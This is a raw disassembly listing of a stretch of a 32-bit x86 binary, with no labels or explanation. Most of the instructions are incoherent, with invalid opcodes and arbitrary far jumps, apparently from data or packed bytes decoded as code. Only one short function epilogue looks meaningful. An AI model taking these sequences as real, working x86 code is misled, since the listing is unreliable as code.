  41c5cc:	sbb    al,0x3
  41c5ce:	aas    
  41c5cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5d0:	ja     0x41c5ed
  41c5d2:	(bad)  
  41c5d3:	jmp    0xb72438b0
  41c5d8:	xchg   esi,eax
  41c5d9:	pop    eax
  41c5da:	shr    BYTE PTR [esi+0x26],cl
  41c5dd:	lahf   
  41c5de:	daa    
  41c5df:	mov    eax,ds:0x8a314b74
  41c5e4:	mov    ds:0xffee5d43,eax
  41c5e9:	rcr    BYTE PTR [ebp-0x75],cl
  41c5ec:	pop    eax
  41c5ed:	push   ss
  41c5ee:	pushf  
  41c5ef:	(bad)
  41c5f2:	popf   
  41c5f3:	stc    
  41c5f4:	or     esi,DWORD PTR [eax-0x3f]
  41c5f7:	fcom   DWORD PTR [ecx-0x288ec103]
  41c5fd:	loop   0x41c5b7
  41c5ff:	test   eax,0x5a60a243
  41c604:	out    0x2b,al
  41c606:	push   ebp
  41c607:	repz pusha 
  41c609:	sbb    ebx,DWORD PTR [edi]
  41c60b:	ins    BYTE PTR es:[edi],dx
  41c60c:	jno    0x41c5c4
  41c60e:	xchg   al,al
  41c610:	ret    0x855c
  41c613:	idiv   DWORD PTR [ebx+eax*4+0x4e]
  41c617:	icebp  
  41c618:	pop    eax
  41c619:	sar    DWORD PTR ds:0xdb69d699,1
  41c61f:	or     bh,0xaa
  41c622:	inc    edx
  41c623:	inc    ecx
  41c624:	in     al,dx
  41c625:	mov    dh,0x62
  41c627:	and    cl,BYTE PTR [edi-0x66375834]
  41c62d:	stc    
  41c62e:	test   al,0x22
  41c630:	push   es
  41c631:	and    eax,0xf39239e0
  41c636:	(bad)  
  41c638:	nop
  41c639:	push   0x9
  41c63b:	test   al,0x3a
  41c63d:	cs sbb eax,0xb5b3db43
  41c643:	ss das 
  41c645:	xchg   esi,eax
  41c646:	out    dx,al
  41c647:	retf   0xf879
  41c64a:	ret    0x209e
  41c64d:	out    dx,al
  41c64e:	xchg   ebp,eax
  41c64f:	mov    ch,0x27
  41c651:	mov    cs,WORD PTR [eax-0x5da2b09a]
  41c657:	xchg   ebx,eax
  41c658:	push   esp
  41c659:	cmp    dh,BYTE PTR [esi-0x4bf4e845]
  41c65f:	ret    0xa368
  41c662:	xchg   DWORD PTR [edx-0xa],ebx
  41c665:	add    ecx,edi
  41c667:	out    dx,al
  41c668:	clc    
  41c669:	xchg   edx,eax
  41c66a:	push   es
  41c66b:	fistp  DWORD PTR [esi+0x3e5b41c3]
  41c671:	fwait
  41c672:	dec    esi
  41c673:	xor    ebp,esi
  41c675:	outs   dx,BYTE PTR ds:[esi]
  41c676:	ret    0xfdb8
  41c679:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c67a:	and    eax,0x69df0118
  41c67f:	push   ds
  41c680:	jne    0x41c625
  41c682:	fadd   st,st(0)
  41c684:	loopne 0x41c664
  41c686:	clc    
  41c687:	push   0x66a5fda7
  41c68c:	fdecstp 
  41c68e:	mov    BYTE PTR [edi+0x2f],bh
  41c691:	aas    
  41c692:	mov    WORD PTR [edx-0x6d1e5a4d],cs
  41c698:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c699:	mov    al,0x4d
  41c69b:	mov    edx,0xa7eb5ee6
  41c6a0:	test   BYTE PTR [esi-0x1eda481d],bl
  41c6a6:	gs lahf 
  41c6a8:	lds    ebx,FWORD PTR [eax-0x4b8db65e]
  41c6ae:	push   ds
  41c6af:	js     0x41c710
  41c6b1:	fld    TBYTE PTR [eax]
  41c6b3:	sub    ch,cl
  41c6b5:	dec    edx
  41c6b6:	aas    
  41c6b7:	or     al,0xa6
  41c6b9:	(bad)  
  41c6bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6be:	test   BYTE PTR [ebp+0x1a],al
  41c6c1:	inc    eax
  41c6c2:	pop    ebp
  41c6c3:	sub    BYTE PTR [ebx+0x34e21d5c],0x83
  41c6ca:	outs   dx,DWORD PTR ds:[esi]
  41c6cb:	test   BYTE PTR [edi-0x60],bh
  41c6ce:	(bad)  [ecx+eax*1-0x73]
  41c6d2:	aaa    
  41c6d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6d4:	mov    cl,0x5d
  41c6d6:	xchg   ebp,eax
  41c6d7:	mov    esp,0x45355596
  41c6dc:	pop    edi
  41c6dd:	enter  0x19d9,0x94
  41c6e1:	inc    esp
  41c6e2:	add    dh,BYTE PTR [ebp+0x6a]
  41c6e5:	fidiv  WORD PTR [eax]
  41c6e7:	mov    eax,0x9c5bd2c3
  41c6ec:	fisub  DWORD PTR [eax+0x1de2163b]
  41c6f2:	sbb    eax,0x28c79480
  41c6f7:	jecxz  0x41c715
  41c6f9:	(bad)  
  41c6fa:	loopne 0x41c764
  41c6fc:	cli    
  41c6fd:	fld    QWORD PTR [edx]
  41c6ff:	mov    edx,DWORD PTR [edi-0x48f53ec4]
  41c705:	imul   ecx,DWORD PTR [esi],0x98d6488e
  41c70b:	aaa    
  41c70c:	dec    eax
  41c70d:	and    eax,0xc2db710d
  41c712:	sub    ah,dh
  41c714:	lea    esp,[ecx+0x34]
  41c717:	cwde   
  41c718:	sub    eax,0x67956a71
  41c71d:	xchg   ecx,eax
  41c71e:	js     0x41c779
  41c720:	es ss data16 into 
  41c724:	sahf   
  41c725:	pop    ecx
  41c726:	jle    0x41c751
  41c728:	push   0x35
  41c72a:	aas    
  41c72b:	mov    esi,0xf519b58f
  41c730:	aad    0xd0
  41c732:	push   edx
  41c733:	ja     0x41c74a
  41c735:	test   eax,0x13242ada
  41c73a:	rcl    DWORD PTR [ebx+0x6360b0ea],1
  41c740:	push   ss
  41c741:	push   eax
  41c742:	dec    ebx
  41c743:	popa   
  41c744:	in     eax,0xe6
  41c746:	push   edx
  41c747:	push   esp
  41c748:	adc    ebx,DWORD PTR [edi+ebp*2]
  41c74b:	int3   
  41c74c:	pop    ebx
  41c74d:	jmp    0x3865:0x819b949e
  41c754:	into   
  41c755:	dec    ebp
  41c756:	dec    edi
  41c757:	push   0xfffa4de6
  41c75c:	or     BYTE PTR [ebx],0xed
  41c75f:	or     cl,BYTE PTR [ecx+0xd86ea42]
  41c765:	leave  
  41c766:	or     al,0x3
  41c768:	pushf  
  41c769:	or     BYTE PTR es:[ebp+edx*1-0x1167f1f1],cl
  41c771:	add    cl,cl
  41c773:	push   cs
  41c774:	repz sub al,0x3e
  41c777:	nop
  41c778:	adc    ah,cl
  41c77a:	dec    BYTE PTR [edx+0x78]
  41c77d:	imul   ebx,esp,0xffffffc6
  41c780:	dec    edx
  41c781:	cmc    
  41c782:	jmp    0x4ae06bea
  41c787:	push   es
  41c788:	or     al,0x44
  41c78a:	and    edi,ebp
  41c78c:	lea    esp,[edx+0x31470f2c]
  41c792:	in     al,0x40
  41c794:	pushf  
  41c795:	imul   edx,DWORD PTR [ebp+0x37288884],0x9ecce324
  41c79f:	or     ch,BYTE PTR fs:[esi+ebx*8]
  41c7a3:	aaa    
  41c7a4:	push   ebp
  41c7a5:	push   0xdf398b69
  41c7aa:	inc    esi
  41c7ab:	push   esi
  41c7ac:	aas    
  41c7ad:	mov    bl,0x90
  41c7af:	sub    edx,DWORD PTR [ebx]
  41c7b1:	xchg   bh,bl
  41c7b3:	ja     0x41c759
  41c7b5:	dec    ecx
  41c7b6:	adc    DWORD PTR [ebp-0x1dd568a3],esi
  41c7bc:	loopne 0x41c77a
  41c7be:	imul   esp,ebp,0x6f80971b
  41c7c4:	xchg   esi,eax
  41c7c5:	hlt    
  41c7c6:	add    ecx,DWORD PTR [ecx]
  41c7c8:	sub    edx,edi
  41c7ca:	shr    esp,1
  41c7cc:	out    0x3e,al
  41c7ce:	xchg   edx,eax
  41c7cf:	test   al,0x53
  41c7d1:	push   ds
  41c7d2:	mov    es,WORD PTR [ebp-0x5bea0da9]
  41c7d8:	dec    DWORD PTR [esp+edx*2-0x15]
  41c7dc:	enter  0x533e,0x28
  41c7e0:	inc    edi
  41c7e1:	aam    0xde
  41c7e3:	cli    
  41c7e4:	mul    DWORD PTR [ebx-0x56326b06]
  41c7ea:	cli    
  41c7eb:	jb     0x41c837
  41c7ed:	inc    esp
  41c7ee:	sbb    DWORD PTR [edx+0x7489d5b8],0x1f
  41c7f5:	jecxz  0x41c7fc
  41c7f7:	mov    edx,0x5309bc41
  41c7fc:	jl     0x41c78c
  41c7fe:	arpl   WORD PTR [edx],dx
  41c800:	repnz stc 
  41c802:	shl    BYTE PTR [eax+0x68],1
  41c805:	dec    ebx
  41c806:	jl     0x41c877
  41c808:	aad    0x40
  41c80a:	jge    0x41c859
  41c80c:	pusha  
  41c80d:	mov    al,ds:0x9bf61918
  41c812:	mov    al,0x1f
  41c814:	sar    cl,cl
  41c816:	std    
  41c817:	popf   
  41c818:	js     0x41c7d6
  41c81a:	mov    WORD PTR [esi],cs
  41c81c:	jo     0x41c887
  41c81e:	out    0x10,eax
  41c820:	jge    0x41c892
  41c822:	aas    
  41c823:	mov    cl,0xa4
  41c825:	jmp    0x3e4a28db
  41c82a:	scas   eax,DWORD PTR es:[edi]
  41c82b:	xchg   ebx,eax
  41c82c:	adc    eax,0x356e426b
  41c831:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c832:	fs pop edi
  41c834:	push   0x2ea1ccad
  41c839:	aaa    
  41c83a:	stos   BYTE PTR es:[edi],al
  41c83b:	push   ebp
  41c83c:	ror    ebx,1
  41c83e:	and    al,0x40
  41c840:	fmul   st(4),st
  41c842:	inc    esp
  41c843:	jae    0x41c842
  41c845:	dec    eax
  41c847:	pop    edx
  41c848:	and    DWORD PTR [ebx],edx
  41c84a:	or     al,0x28
  41c84c:	sbb    eax,0x9c2e85b6
  41c851:	fmulp  st(4),st
  41c853:	js     0x41c805
  41c855:	xor    ebp,DWORD PTR [eax+ebx*2-0xeb5298]
  41c85c:	out    dx,eax
  41c85d:	mov    al,0xd7
  41c85f:	loop   0x41c870
  41c861:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c862:	daa    
  41c863:	adc    eax,0xcd112240
  41c868:	or     al,0xfb
  41c86a:	imul   esp,edi,0xffffffc3
  41c86d:	cmp    BYTE PTR [ebx+0x4aa888b7],0x14
  41c874:	xor    BYTE PTR [eiz*1-0x753c26c9],dh
  41c87b:	aas    
  41c87c:	and    eax,0x2d9d1745
  41c881:	xchg   ecx,eax
  41c882:	and    al,0xd5
  41c884:	out    0x58,eax
  41c886:	stos   DWORD PTR es:[edi],eax
  41c887:	dec    esi
  41c888:	xor    bl,bh
  41c88a:	test   al,0xf6
  41c88c:	imul   ecx,DWORD PTR [edi],0x5
  41c88f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c890:	jns    0x41c847
  41c892:	popa   
  41c893:	inc    edi
  41c894:	imul   esi,DWORD PTR [ebx],0x78
  41c897:	mov    edi,0x34b629c0
  41c89c:	clc    
  41c89d:	aaa    
  41c89e:	add    eax,ecx
  41c8a0:	mov    ecx,DWORD PTR [ebp+0xc]
  41c8a3:	imul   eax,ecx
  41c8a6:	add    eax,DWORD PTR [ebp+0x8]
  41c8a9:	mov    DWORD PTR [ebp+0xc],eax
  41c8ac:	mov    eax,DWORD PTR [ebp+0xc]
  41c8af:	pop    esi
  41c8b0:	leave  
  41c8b1:	ret    0x8
  41c8b4:	pop    ss
  41c8b5:	or     al,0x84
  41c8b7:	repz lahf 
  41c8b9:	sti    
  41c8ba:	ja     0x41c8a8
  41c8bc:	stos   BYTE PTR es:[edi],al
  41c8bd:	mov    edx,0x6f4588e2
  41c8c2:	popf   
  41c8c3:	int3   
  41c8c4:	scas   eax,DWORD PTR es:[edi]
  41c8c5:	test   DWORD PTR [ecx],eax
  41c8c7:	add    BYTE PTR [eax+eax*1+0x53a0000],ch
  41c8ce:	fimul  DWORD PTR [edi]
  41c8d0:	and    ah,BYTE PTR [ebp-0x759dbdfb]
  41c8d6:	jnp    0x41c925
  41c8d8:	pop    ss
  41c8d9:	jne    0x41c897
  41c8db:	and    BYTE PTR [eax],dh
  41c8dd:	icebp  
  41c8de:	mov    ebp,0x6881f13e
  41c8e3:	lahf   
  41c8e4:	push   ebp
  41c8e5:	add    dl,BYTE PTR [ebx+0x61e4f982]
  41c8eb:	cmp    ebp,DWORD PTR [esi+0x4190d16]
  41c8f1:	adc    al,0x10
  41c8f3:	push   ebx
  41c8f4:	jne    0x41c915
  41c8f6:	(bad)  
  41c8f7:	pop    ds
  41c8f8:	mov    ?,WORD PTR [ecx+eax*1-0x67]
  41c8fc:	imul   esp,DWORD PTR [ebp-0x5b36ec99],0xfffffffc
  41c903:	(bad)  
  41c904:	push   ss
  41c905:	cmp    eax,0x21487256
  41c90a:	mov    eax,ds:0x581b1cfd
  41c90f:	cmp    eax,0xca541ad3
  41c914:	push   esp
  41c915:	and    DWORD PTR [ecx+0x60],eax
  41c918:	mov    eax,0xf52d182b
  41c91d:	aas    
  41c91e:	dec    edi
  41c91f:	mov    al,0x26
  41c921:	(bad)  
  41c923:	fild   QWORD PTR [edx+ecx*1]
  41c926:	jle    0x41c976
  41c928:	jne    0x41c8ab
  41c92a:	fs icebp 
  41c92c:	jbe    0x41c8dc
  41c92e:	push   edx
  41c92f:	xchg   edx,eax
  41c930:	lods   al,BYTE PTR ds:[esi]
  41c931:	push   ecx
  41c932:	les    esp,FWORD PTR [eax+edi*4+0x2665649d]
  41c939:	(bad)  
  41c93a:	mov    BYTE PTR ds:0x780c2fd8,ah
  41c940:	jl     0x41c94b
  41c942:	xchg   BYTE PTR [ebx+0x3e860b04],bh
  41c948:	std    
  41c949:	movsx  edx,WORD PTR [ecx+eiz*1]
  41c94d:	cdq    
  41c94e:	push   edi
  41c94f:	mov    esi,0x7eaa4a58
  41c954:	sbb    dl,0x4e
  41c957:	test   al,0xa7
  41c959:	jno    0x41c91e
  41c95b:	out    dx,al
  41c95c:	mov    gs,esi
  41c95e:	add    DWORD PTR [ecx+0x5bdb7c85],edx
  41c964:	dec    eax
  41c965:	je     0x41c97c
  41c967:	aaa    
  41c968:	pop    DWORD PTR [eax+0x12577740]
  41c96e:	sbb    esi,0xffffff82
  41c971:	cdq    
  41c972:	push   cs
  41c973:	jb     0x41c98e
  41c975:	ins    BYTE PTR es:[edi],dx
  41c976:	dec    esi
  41c977:	fadd   DWORD PTR [eax]
	...
  41c981:	add    BYTE PTR [eax],al
  41c983:	add    cl,dl
  41c985:	sub    al,0x14
  41c987:	adc    edi,ebp
  41c989:	cmp    edx,edi
  41c98b:	out    dx,al
  41c98c:	pop    edi
  41c98d:	xchg   bx,ax
  41c98f:	push   0x61575458
  41c994:	pop    ebx
  41c995:	xchg   BYTE PTR [ecx],al
  41c997:	add    BYTE PTR [eax+eax*1+0x4fef0000],ch
  41c99e:	mov    DWORD PTR [edx+0x41],ebp
  41c9a1:	adc    al,BYTE PTR [esi]
  41c9a3:	cdq    
  41c9a4:	fwait
  41c9a5:	sbb    BYTE PTR [edx+0x67],bl
  41c9a8:	outs   dx,DWORD PTR fs:[esi]
  41c9aa:	lea    ecx,[ecx+0x28]
  41c9ad:	retf   
  41c9ae:	in     al,0x8f
  41c9b0:	sbb    BYTE PTR [ebx-0x1e],al
  41c9b3:	out    0x5d,eax
  41c9b5:	loope  0x41c9d2
  41c9b7:	inc    eax
  41c9b8:	addr16 fst st(2)
  41c9bb:	pop    edx
  41c9bc:	test   al,0xb4
  41c9be:	and    DWORD PTR [esi-0x49],0xb0824dca
  41c9c5:	adc    al,BYTE PTR [esi-0x38]
  41c9c8:	les    ebp,FWORD PTR [edx+eax*2+0x11fa2c82]
  41c9cf:	pop    eax
  41c9d0:	xor    dl,BYTE PTR [ebx-0x5d84a0d1]
  41c9d6:	lahf   
  41c9d7:	scas   al,BYTE PTR es:[edi]
  41c9d8:	adc    eax,0x3b05b9fb
  41c9dd:	fisubr DWORD PTR [ebx]
  41c9df:	je     0x41c9bf
  41c9e1:	cli    
  41c9e2:	inc    esi
  41c9e3:	cmp    bl,BYTE PTR ds:0x38f98bf8
  41c9e9:	push   es
  41c9ea:	mov    edx,0x43f8f337
  41c9ef:	retf   0xcb54
  41c9f2:	mov    esp,0x2b44998d
  41c9f7:	sbb    BYTE PTR [ecx+0xf],al
  41c9fa:	inc    esi
  41c9fb:	int3   
  41c9fc:	repnz mov al,0xa7
  41c9ff:	inc    esi
  41ca00:	cwde   
  41ca01:	pop    es
  41ca02:	call   0xfb7a:0xe33fa35f
  41ca09:	cmp    ebp,DWORD PTR [ecx-0x3b83a6e5]
  41ca0f:	sbb    al,0xd6
  41ca11:	fidiv  WORD PTR [edx+0x6c]
  41ca14:	int    0x2b
  41ca16:	and    ebx,DWORD PTR [ebp+0x72902240]
  41ca1c:	out    0xe1,eax
  41ca1e:	push   esi
  41ca1f:	mov    dh,0x36
  41ca21:	mov    dh,0xaa
  41ca23:	ins    BYTE PTR es:[edi],dx
  41ca24:	cdq    
  41ca25:	sub    ch,BYTE PTR [ebx+eiz*1+0x793e5bd7]
  41ca2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca2d:	jbe    0x41ca27
  41ca2f:	cs out dx,al
  41ca31:	sbb    DWORD PTR [ebx],esp
  41ca33:	sub    cl,BYTE PTR [edi-0x26]
  41ca36:	xchg   edi,eax
  41ca37:	imul   ecx,eax,0xffffffd0
  41ca3a:	sti    
  41ca3b:	mov    bl,0x99
  41ca3d:	rol    DWORD PTR [eax+0x21],1
  41ca40:	pop    edi
  41ca41:	cmp    eax,0x29e71135
  41ca46:	xchg   edi,eax
  41ca47:	repz add BYTE PTR [eax],al
	...
  41ca52:	add    BYTE PTR [eax],al
  41ca54:	pop    ds
  41ca55:	sub    esp,DWORD PTR [eax-0x60404bc1]
  41ca5b:	sub    eax,esi
  41ca5d:	add    BYTE PTR [edi+eax*2-0xbbe2953],0x7
  41ca65:	xchg   DWORD PTR [ecx],eax
  41ca67:	add    BYTE PTR [eax+eax*1-0xd4b0000],ch
  41ca6e:	mov    edi,0x91f02f16
  41ca73:	mov    esp,0x2235a65d
  41ca78:	add    eax,0x4531d6d3
  41ca7d:	add    eax,0x1d0127c7
  41ca82:	fsub   st,st(5)
  41ca84:	or     ah,BYTE PTR [edx]
  41ca86:	push   0x84ba8932
  41ca8b:	pop    esp
  41ca8c:	cmp    ah,BYTE PTR [ebx+0x64]
  41ca8f:	ins    DWORD PTR es:[edi],dx
  41ca90:	pop    ebp
  41ca91:	scas   eax,DWORD PTR es:[edi]
  41ca92:	std    
  41ca93:	ret    
  41ca94:	jno    0x41ca7f
  41ca96:	pushf  
  41ca97:	mov    ebx,0x3382f440
  41ca9c:	aas    
  41ca9d:	pusha  
  41ca9e:	xor    bl,BYTE PTR [edi-0x44313a65]
  41caa4:	sbb    ch,BYTE PTR [edi+eax*1+0x64]
  41caa8:	jnp    0x41caaf
  41caaa:	ret    
  41caab:	in     eax,0xf0
  41caad:	inc    edx
  41caae:	push   ebx
  41caaf:	fucomi st,st(6)
  41cab1:	stos   DWORD PTR es:[edi],eax
  41cab2:	aad    0xef
  41cab4:	les    edi,FWORD PTR [edx-0x6fa22ef0]
  41caba:	dec    ecx
  41cabb:	mov    esp,0xafb37e12
  41cac0:	sbb    dl,BYTE PTR [esp+ebp*4+0x2e5cc36d]
  41cac7:	loop   0x41cac8
  41cac9:	push   esp
  41caca:	push   ebp
  41cacb:	hlt    
  41cacc:	enter  0xcd61,0x74
  41cad0:	inc    ebp
  41cad1:	fwait
  41cad2:	mov    cl,0x22
  41cad4:	popa   
  41cad5:	fninit 
  41cad7:	xchg   ebp,eax
  41cad8:	and    edi,DWORD PTR [esi]
  41cada:	adc    ch,BYTE PTR [esi+0x4e]
  41cadd:	shl    BYTE PTR [ebx+eax*1+0x574b1e36],1
  41cae4:	add    DWORD PTR [ebx],0x487452dd
  41caea:	add    BYTE PTR [ebx+edi*4],0xd9
  41caee:	push   esi
  41caef:	clc    
  41caf0:	cmc    
  41caf1:	or     BYTE PTR [ecx+0x594008fe],0xb9
  41caf8:	add    al,ch
  41cafa:	fisttp QWORD PTR [eax+0x59]
  41cafd:	adc    bl,BYTE PTR [esi+0xc0c3390]
  41cb03:	pop    esi
  41cb04:	loope  0x41cb29
  41cb06:	out    0xf8,eax
  41cb08:	and    dh,BYTE PTR [edi+0x36]
  41cb0b:	(bad)  
  41cb0c:	data16 ja 0x41cada
  41cb0f:	fdiv   QWORD PTR [edx]
  41cb11:	(bad)  [ebx+eiz*8+0xd214baf]
	...
  41cb24:	das    
  41cb25:	and    al,0xf0
  41cb27:	aam    0xfb
  41cb29:	aam    0x2f
  41cb2b:	jmp    FWORD PTR [esi+0x33]
  41cb2e:	je     0x41cae6
  41cb30:	push   esi
  41cb31:	jnp    0x41caf4
  41cb33:	jp     0x41cae8
  41cb35:	xchg   DWORD PTR [ecx],eax
  41cb37:	add    BYTE PTR [eax+eax*1+0x7cd20000],ch
  41cb3e:	pop    esp
  41cb3f:	add    BYTE PTR [ebx],al
  41cb41:	push   edx
  41cb42:	cmc    
  41cb43:	jb     0x41cba7
  41cb45:	jg     0x41cafb
  41cb47:	retf   0x656
  41cb4a:	pop    ebx
  41cb4b:	push   0x6c
  41cb4d:	cmp    dh,BYTE PTR [ebx-0x78]
  41cb50:	es xor bl,dh
  41cb53:	mov    bh,0xf7
  41cb55:	inc    ecx
  41cb56:	xchg   ebx,eax
  41cb57:	push   edi
  41cb58:	test   BYTE PTR [edx+eax*2],dl
  41cb5b:	into   
  41cb5c:	jns    0x41cadf
  41cb5e:	sub    eax,DWORD PTR [edi-0x29]
  41cb61:	sub    DWORD PTR [ebx],0xf207b998
  41cb67:	push   eax
  41cb68:	mov    bh,0x46
  41cb6a:	inc    ebp
  41cb6b:	inc    edi
  41cb6c:	and    DWORD PTR [ecx],ebp
  41cb6e:	sbb    DWORD PTR [esi+eiz*1+0x516a93a5],eax
  41cb75:	mov    cl,0x83
  41cb77:	(bad)  
  41cb78:	jge    0x41cbdc
  41cb7a:	xchg   edx,eax
  41cb7b:	ret    0x468d
  41cb7e:	ja     0x41cbeb
  41cb80:	adc    edi,DWORD PTR [ecx+0x47]
  41cb83:	add    esp,DWORD PTR [eax-0x27abf37d]
  41cb89:	clc    
  41cb8a:	(bad)  
  41cb8b:	loope  0x41cb19
  41cb8d:	or     al,0x58
  41cb8f:	jle    0x41cbb3
  41cb91:	cmp    bl,dh
  41cb93:	inc    ebx
  41cb94:	and    esi,eax
  41cb96:	pop    ds
  41cb97:	lods   al,BYTE PTR ds:[esi]
  41cb98:	jecxz  0x41cc09
  41cb9a:	mov    bh,0x6d
  41cb9c:	loopne 0x41cb3e
  41cb9e:	push   es
  41cb9f:	adc    bh,dl
  41cba1:	stos   BYTE PTR es:[edi],al
  41cba2:	push   edi
  41cba3:	stos   DWORD PTR es:[edi],eax
  41cba4:	outs   dx,DWORD PTR ds:[esi]
  41cba5:	push   edi
  41cba6:	push   edx
  41cba7:	push   edx
  41cba8:	gs call 0xa275:0xc434b1b7
  41cbb0:	xor    al,0x92
  41cbb2:	xor    esp,DWORD PTR [ecx+0x6c]
  41cbb5:	gs mov cl,0xb4
  41cbb8:	jbe    0x41cbd6
  41cbba:	pop    ecx
  41cbbb:	mov    eax,ds:0x645cfd53
  41cbc0:	and    BYTE PTR ds:0xd4341805,ah
  41cbc6:	and    DWORD PTR [ecx+0x50d066d5],esp
  41cbcc:	sbb    DWORD PTR [edx+0x52],eax
  41cbcf:	iret   
  41cbd0:	sar    DWORD PTR [esi],cl
  41cbd2:	and    DWORD PTR [ecx+0x12],edi
  41cbd5:	sbb    al,0x3b
  41cbd7:	jbe    0x41cba4
  41cbd9:	iret   
  41cbda:	and    BYTE PTR [edx+0x16],bl
  41cbdd:	xchg   edx,eax
  41cbde:	jle    0x41cc44
  41cbe0:	stc    
  41cbe1:	mov    edi,0x2b171ec2
  41cbe6:	adc    dl,BYTE PTR [ecx+0x0]
	...
  41cbf1:	add    BYTE PTR [eax],al
  41cbf3:	add    dl,cl
  41cbf5:	mov    al,ds:0xdf7e4d76
  41cbfa:	sti    
  41cbfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbfc:	mov    bh,0x83
  41cbfe:	dec    edi
  41cbff:	mov    ds:0x224278e,al
  41cc04:	pop    edi
  41cc05:	mov    BYTE PTR [ecx],al
  41cc07:	add    BYTE PTR [eax+eax*1+0x435f0000],ch
  41cc0e:	ja     0x41cbf3
  41cc10:	sub    BYTE PTR [edx-0x56],cl
  41cc13:	into   
  41cc14:	mov    bh,0xb0
  41cc16:	or     eax,0x9c1569b7
  41cc1b:	xchg   esp,eax
  41cc1c:	push   0x8344ee4c
  41cc21:	int    0x6e
  41cc23:	push   ebx
  41cc24:	adc    DWORD PTR [ebx],esi
  41cc26:	mov    esi,0x1cf9c0e3
  41cc2b:	xchg   ebp,eax
  41cc2c:	call   FWORD PTR [eax-0x15]
  41cc2f:	xchg   ebp,eax
  41cc30:	or     al,0x8
  41cc32:	push   0xffffff87
  41cc34:	inc    ecx
  41cc35:	enter  0x8026,0x83
  41cc39:	push   0x61a2f949
  41cc3e:	mov    ebp,edi
  41cc40:	cld    
  41cc41:	jbe    0x41cc28
  41cc43:	mov    bl,0x74
  41cc45:	fwait
  41cc46:	shl    BYTE PTR [edx+eiz*8+0x5a],cl
  41cc4a:	call   0x8166:0xdc8c9e5
  41cc51:	sub    BYTE PTR [eax-0x2b40222d],al
  41cc57:	pop    eax
  41cc58:	ret    0xb5bf
  41cc5b:	jg     0x41cc76
  41cc5d:	push   ss
  41cc5e:	iret   
  41cc5f:	push   ecx
  41cc60:	lods   eax,DWORD PTR ds:[esi]
  41cc61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc62:	push   es
  41cc63:	dec    ebx
  41cc64:	aad    0x1b
  41cc66:	mov    dh,0x71
  41cc68:	ja     0x41cc9a
  41cc6a:	(bad)  
  41cc6c:	adc    DWORD PTR [ecx+ecx*4+0x30fb020],0xe5719d3c
  41cc77:	(bad)  [eax+0x3]
  41cc7a:	xchg   BYTE PTR [ecx],al
  41cc7c:	inc    edx
  41cc7d:	push   ecx
  41cc7e:	repz out 0x1a,al
  41cc81:	adc    eax,0x75070905
  41cc86:	or     al,0x27
  41cc88:	xchg   ecx,eax
  41cc89:	test   eax,0xd1aefe8d
  41cc8e:	retf   0xe166
  41cc91:	mov    ch,0x45
  41cc93:	jl     0x41cce7
  41cc95:	loope  0x41cd01
  41cc97:	or     ebp,ecx
  41cc99:	mov    bh,0x77
  41cc9b:	mov    cl,0x4c
  41cc9d:	js     0x41ccf9
  41cc9f:	sbb    edx,esi
  41cca1:	shl    DWORD PTR [eax+edi*2],cl
  41cca4:	dec    esp
  41cca5:	in     eax,dx
  41cca6:	or     DWORD PTR [eax],esp
  41cca8:	imul   edi,DWORD PTR [ebx-0x491c2d0e],0xffffffec
  41ccaf:	pop    ds
  41ccb0:	xchg   ebp,eax
  41ccb1:	jae    0xdc614d62
  41ccb7:	cli    
	...
  41ccc4:	(bad)  
  41ccc5:	out    dx,al
  41ccc6:	lods   al,BYTE PTR ds:[esi]
  41ccc7:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  41ccce:	stc    
  41cccf:	stc    
  41ccd0:	mov    al,ds:0xb141d1e
  41ccd5:	mov    DWORD PTR [ecx],eax
  41ccd7:	add    BYTE PTR [eax+eax*1+0x24ae0000],ch
  41ccde:	bound  ecx,QWORD PTR [edx-0x76]
  41cce1:	jne    0x41cd14
  41cce3:	arpl   WORD PTR ds:0x57fad337,di
  41cce9:	mul    DWORD PTR [ecx+0x70]
  41ccec:	sub    BYTE PTR [esi+esi*1],dl
  41ccef:	jmp    0xed2544ac
  41ccf4:	shl    BYTE PTR [edx-0x35],cl
  41ccf7:	popf   
  41ccf8:	xor    al,0x19
  41ccfa:	mov    bl,0xa3
  41ccfc:	push   0x469f3181
  41cd01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd02:	jmp    0x46ef:0x70257b12
  41cd09:	es xchg esi,eax
  41cd0b:	ret    
  41cd0c:	sbb    DWORD PTR [eax+0x570768e3],ecx
  41cd12:	retf   
  41cd13:	out    0x3,eax
  41cd15:	adc    al,0x8b
  41cd17:	dec    ebx
  41cd18:	push   0xa7ef320d
  41cd1d:	xor    edi,DWORD PTR [ebx-0x2fbd6a8]
  41cd23:	dec    ebp
  41cd24:	jb     0x41cd49
  41cd26:	ja     0x41cd6e
  41cd28:	lods   al,BYTE PTR ds:[esi]
  41cd29:	sbb    DWORD PTR [ecx+0x29],esp
  41cd2c:	arpl   WORD PTR [esi],sp
  41cd2e:	ror    BYTE PTR [edi-0x35],1
  41cd31:	clc    
  41cd32:	int    0xca
  41cd34:	xchg   esi,eax
  41cd35:	sub    al,0xad
  41cd37:	jns    0x41cd3b
  41cd39:	add    BYTE PTR [ecx-0x5bf0e6ab],bh
  41cd3f:	xlat   BYTE PTR gs:[ebx]
  41cd41:	out    dx,eax
  41cd42:	ins    BYTE PTR es:[edi],dx
  41cd43:	add    BYTE PTR [edi+0x4788b2a4],al
  41cd49:	rcl    BYTE PTR [ecx-0x5d8709c4],1
  41cd4f:	fistp  WORD PTR [ebp-0x6d82d564]
  41cd55:	xchg   esp,eax
  41cd56:	ss jae 0x41cd3a
  41cd59:	add    esp,DWORD PTR [eax+0xe]
  41cd5c:	retf   0x5d2e
  41cd5f:	dec    edx
  41cd60:	in     al,0xb7
  41cd62:	fld    TBYTE PTR [esi]
  41cd64:	inc    esp
  41cd65:	gs out dx,al
  41cd67:	shr    BYTE PTR [ecx-0x66aa5ea3],0x47
